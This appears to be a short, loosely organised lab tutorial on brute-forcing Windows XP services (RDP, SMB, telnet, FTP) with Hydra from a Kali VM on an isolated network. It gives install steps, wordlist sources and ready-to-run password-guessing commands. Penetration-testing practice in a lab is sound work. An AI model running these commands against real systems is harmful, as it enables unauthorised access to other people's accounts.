1. 
Both VMs on Host-Only or Internal Network adapter (never bridge/NAT to real internet)
Windows XP firewall off during tests (or allow the ports)

Attacker machine  →  Kali Linux 2025                    192.168.56.10
Target machine    →  Windows XP SP3                     192.168.56.20

|Service|Port|Module
|-|-|
|RDP|3389|rdp|
|SMB|445|smb/smb2|
|Telnet|23|telnet|
|FTP|21|ftp|
|HTTP auth|80|http-get

3. Install Hydra on Linux
# Kali / Parrot 
sudo apt update
sudo apt install hydra

# Check version
hydra -h | head

# Or compile fresh from github 
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install

4.
Prepare wordlist
# Very small for quick demo (create yourself)
echo -e "password\nadmin\n123456\nxp123\nletmein\nsecret" > xp_passwords.txt

# Common old lists (Kali has them)
ls /usr/share/wordlists/
rockyou.txt.gz          → gunzip first if needed
dirb/common.txt
metasploit/passwords.txt
seclists/Passwords/...

5.
Known username, small password list
# Basic syntax
hydra -l administrator -P xp_passwords.txt -t 1 -V 192.168.56.20 rdp


# Good realistic XP passwords 2005-2010 era
curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -o big.txt

-l       = single known username
-P       = password file
-t 1     = very important — only 1 thread (RDP on XP locks / slows down with many threads)
-V       = verbose → shows every try (great for learning)
rdp://IP = protocol + target

users.txt contents
administrator
guest
user
owner
student
teacher

6.
SMB file sharing
# SMB (Windows file share / null session possible on XP)
hydra -l administrator -P xp_passwords.txt -t 4 -V 192.168.56.20 smb
# or smb2 on newer hydra versions

hydra -l admin -P rockyou.txt -t 16 -V 192.168.56.20 telnet
hydra -l ftpuser -P ftp_pass.txt -t 20 ftp://192.168.56.20

7.
Common Problems
Problems on Windows XP + Hydra in 2026

RDP → only 1 thread usually works (XP locks account fast)
SMB → sometimes needs smb2 module on newer Hydra
Encoding problems → add -S for SSL (rare on XP)
Firewall / NAT → make sure ports are reachable (nmap -p 3389,445 192.168.56.20)
Account lockout → XP default is often 0 (no lock), but check
